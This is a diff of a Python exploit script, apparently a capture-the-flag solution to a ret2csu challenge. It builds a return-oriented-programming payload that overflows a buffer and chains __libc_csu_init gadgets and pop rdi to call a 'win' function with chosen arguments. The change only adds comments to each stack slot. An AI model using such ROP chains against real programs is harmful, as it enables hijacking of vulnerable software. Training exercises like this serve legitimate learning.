@@ -453,22 +453,22 @@ _init = next(elf.search(p64(elf.symbols['_init'])))
 payload = flat([
     b'A' * 32,          # offset = 32
     b'FAKE_RBP',        # fake rbp
-    csugadget1,         # 
-    0,                  # rbx
-    1,                  # rbp 
-    _init,              # r12
-    0,                  # r13 
-    0xcafebabecafebabe, # r14 (mov rsi, r14 -> 0xcafebabecafebabe)  
-    0xd00df00dd00df00d, # r15 (mov rdx, r15 -> 0xd00df00dd00df00d)
-    csugadget2,         # ----------------------------------
+    csugadget1,         # __libc_csu_init+90
+    0,                  # pop rbx
+    1,                  # pop rbp 
+    _init,              # pop r12
+    0,                  # pop r13 
+    0xcafebabecafebabe, # pop r14 (mov rsi, r14 -> 0xcafebabecafebabe)  
+    0xd00df00dd00df00d, # pop r15 (mov rdx, r15 -> 0xd00df00dd00df00d)
+    csugadget2,         # __libc_csu_init+64
     0,                  # add rsp, 8 
-    0,                  # rbx
-    0,                  # rbp  
-    0,                  # r12  
-    0,                  # r13  
-    0,                  # r14  
-    0,                  # r15  
-    pop_rdi,            # 
+    0,                  # pop rbx
+    0,                  # pop rbp  
+    0,                  # pop r12  
+    0,                  # pop r13  
+    0,                  # pop r14  
+    0,                  # pop r15  
+    pop_rdi,            # pop rdi
     0xdeadbeefdeadbeef, # rdi -> 0xdeadbeefdeadbeef
     win                 # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
 ])
